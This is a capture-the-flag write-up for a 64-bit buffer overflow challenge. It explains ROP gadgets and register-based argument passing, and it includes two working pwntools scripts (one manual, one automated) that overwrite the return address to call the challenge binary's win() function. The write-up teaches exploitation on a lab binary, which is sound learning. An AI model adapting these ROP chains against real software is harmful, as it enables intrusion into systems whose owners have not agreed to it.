# BufferOverflow-3 Write-Up

## Challenge Details
**-Author:** "BigGamer9000". <br>
**-Description:** "Last Dance". <br>
**-Files:** [Executable](https://github.com/H-Nouh/CTF-Write-Ups/blob/8482b88f6d0398125a08a570df174abd8c2a58d9/GreenHat-CTF/Pwn/BufferOverflow-3/chall), [Source Code](https://github.com/H-Nouh/CTF-Write-Ups/blob/8482b88f6d0398125a08a570df174abd8c2a58d9/GreenHat-CTF/Pwn/BufferOverflow-3/chall.c), [Flag](https://github.com/H-Nouh/CTF-Write-Ups/blob/8482b88f6d0398125a08a570df174abd8c2a58d9/GreenHat-CTF/Pwn/BufferOverflow-3/flag.txt), [Solver](https://github.com/H-Nouh/CTF-Write-Ups/blob/8482b88f6d0398125a08a570df174abd8c2a58d9/GreenHat-CTF/Pwn/BufferOverflow-3/bof3.py). <br>

## Solution

### Initial Approach
  <img width="933" height="116" alt="image" src="https://github.com/user-attachments/assets/d9034797-1767-4b7e-9408-371fac9d8e8d" /> <br>
-We notice that the executable is **64 bits**, and this is **really important**. Before talking about the difference between x32 & x64, let’s check the **source code** first: <br>  
  <img width="491" height="593" alt="image" src="https://github.com/user-attachments/assets/e870c7b1-f429-4e26-86fb-729b0ec39ace" /> <br>
-We can notice the vulnerability in “gets” function. We have a buffer of 64 bytes, but there is no input size check, so we can write more to cause a bufferoverflow and overwrite the return address to call “win” function. <br>
-However, since this is x64, we can’t simply put the arguments in the stack as in x32.  

### Some differences between x32 & x64:
|           | x32 | x64 |
|-----------|----------|----------|
| **Addresses** | 4 Bytes (0x08049220)       | 8 Bytes (0x0000000000401881)       |
| **Number of Registers** | 8 (eax, ebx, ecx, edx, esi, edi, esp, ebp)             | 16 (rax, rbx, rcx, rdx, rsi, rdi, rsp, rbp, r8–r15)       |
| **Function argument passing** | From the stack (right to left order)       | The first 6 through registers (rdi, rsi, rdx, rcx, r8, r9) and the rest from the stack       |

-This means that in our case in order to get the flag, we have to somehow find a way to fill the registers **rdi** & **rsi** with the values of the 1st & 2nd argument of **win** function. Luckily,
there's a technique that helps us to do that, which is called **ROP (Return Oriented Programming)**.  

### Return Oriented Programming:

**ROP** is a powerful exploitation technique that was first introduced around **2007** as an evolution of **ret2libc** attacks, allowing attackers to bypass memory protections like **DEP** (Data Execution Prevention)
and **NX** (No-Execute), which mark the stack as **non-executable** to block traditional **shellcode** injection and execution through buffer overflows.  

However, it can be **bypassed** through ROP by chaining small assembly instruction sequences known as **"Gadgets"** which already exist in the binary after compilation or linked libraries, allowing the execution
of arbitrary code without the need of injecting custom crafted shellcode.  

Each gadget ends with a **ret** instruction, allowing the attacker to jump to the next one on the stack and connect several gadgets this way, forming what we would call a **"ROP chain"**.
The gadget “pop rdi; ret;” for instance, does the following:  
1. **pop rdi** takes the value at the top of the stack and puts it into the **rdi register**.
2. **ret** pops the next value from the stack into **rip**, resuming execution from that address.

So, in order to **call** a function with one **argument** in x64, the payload would be structured this way:  
**padding + pop_rdi_ret address + arg1 + target_function address**

### Detailed Solution
-Since we need to pass **2 arguments** to our win function to get the flag, we'll be using **RDI** & **RSI** registers, and for that we need to find 2 appropriate gadgets.  
-There are **3 steps** we must go through to finalize our payload: Finding the **offset**, **win** function address, and the addresses of our **gadgets**. 

### 1. Finding the offset:
-The size of our buffer is **64** bytes, and we have **8** bytes for **RBP**, so the offset should be **72** unless there are more things between the buffer and rbp, which we'll assume to not be for now
(I'm just too lazy to calculate the offset manually xD).  
### 2. Finding win’s address: <br>
-We can simply use **nm** on our binary and then grep the address:  
  <img width="323" height="54" alt="image" src="https://github.com/user-attachments/assets/d1a09b77-4772-4ed1-b2fc-c45f39d090a5" /> <br>

-We got our address: **0x0000000000401881**.  
-Note that we used "**-w**" with grep, which tells it to match whole words only, otherwise results of word that contain "win" would be included like "rewind", "unwind", etc.

### 3. Finding our two gadgets’ addresses:
-We'll be using **Ropper** for that (you can use **ROPgadget** as well, but I personally find Ropper more practical):  <br>
  <img width="777" height="386" alt="image" src="https://github.com/user-attachments/assets/d9e44446-4bd4-4485-8c3d-d38d6dbb2b50" /> <br>
  <img width="574" height="405" alt="image" src="https://github.com/user-attachments/assets/e700f4a3-620e-4c73-9a89-0488d437c03e" /> <br>

-Oops, there are a looot of gadgets, that won't help us :")).  
-Since we know exactly what are the 2 gadgets we're looking for (**pop rdi; ret;** and **pop rsi; ret;**), let's search for them specifically:  

  <img width="505" height="189" alt="image" src="https://github.com/user-attachments/assets/6b8c289d-df3d-4c46-b239-fbc14434af0b" /> <br>
  <img width="508" height="185" alt="image" src="https://github.com/user-attachments/assets/96457f35-284d-4992-81f2-248b59a6af91" /> <br>

-Here we go, we got our addresses:  
**pop rdi:** 0x00000000004020f8  
**pop rsi:** 0x0000000000408c90

### Final payload:

-Here's a simple script that crafts our payload and sends it to our binary to retrieve the flag:
```python
from pwn import *

p = process("./chall")

rdi = p64(0x00000000004020f8)

rsi = p64(0x0000000000408c90)

win = p64(0x0000000000401881)

arg1 = p64(0xcafebabe)

arg2 = p64(0xcafed00d)

payload = 72 * b"A" + rdi + arg1 + rsi + arg2 + win 

p.sendline(payload)
p.interactive()
```
-Let's run it:  
  <img width="574" height="144" alt="image" src="https://github.com/user-attachments/assets/4b337e70-23b8-4b71-8fdc-f456808a622f" /> <br>

-Voila, we got our flag!

## Automating the process:
-Instead of getting the offset, win address, and gadgets manually, we can automate all of that. It might seem unimportant now, but the more we advance in challenges, the more complicated and longer things get, which makes
having an automated script really helpful.  
-Here's a script that does that (I explained all the details in the comments):  
```python
from pwn import *

context.binary = elf = ELF('./chall')
"""This loads the binary for us, which is needed to use elf.symbols, elf.got, etc.
It also precises the context (x64 or x32), which is necessary for things like flat."""

# context.log_level = 'debug' 
# Adds more details to logging results. It would've been useful if we were analyzing the challenge for the first time.

p = process(elf.path) 

# ========================= Finding the offset:
payload = cyclic(200)
p.sendline(payload)
p.wait()  # waiting for the program to crash, and produce the core dump
core = p.corefile # loading the crash dump, from which we will read the content of RSP after crashing
offset = cyclic_find(core.read(core.rsp, 4))
# Here we're using cyclic to extract the offset from RSP, which points to our overwritten RIP.
log.success(f"Offset found: {offset}")
p.close()

# ========================= Finding win's address:
win = elf.symbols["win"] # getting win's address from the symbol table of our binary
log.success(f"win() address: {hex(win)}")

# ========================= Finding the necessary gadgets:
rop = ROP(elf) # initiating pwntools' rop manager
rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
# the [0] is needed to return only the first match, since it searches for all matching gadgets.
rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
log.success(f"pop rdi ; ret: {hex(rdi)}")
log.success(f"pop rsi ; ret: {hex(rsi)}")

# ========================= Arguments to pass to win function:
arg1 = 0xcafebabe
arg2 = 0xcafed00d

# ========================= Final payload:
payload = flat( # the flat here does all the automatic p64 stuff and other conversions
    b'A' * offset,
    rdi, arg1,
    rsi, arg2,
    win
)

p = process(elf.path)
p.sendline(payload)
p.interactive()
```

# Congrats on your first ROP Exploit!




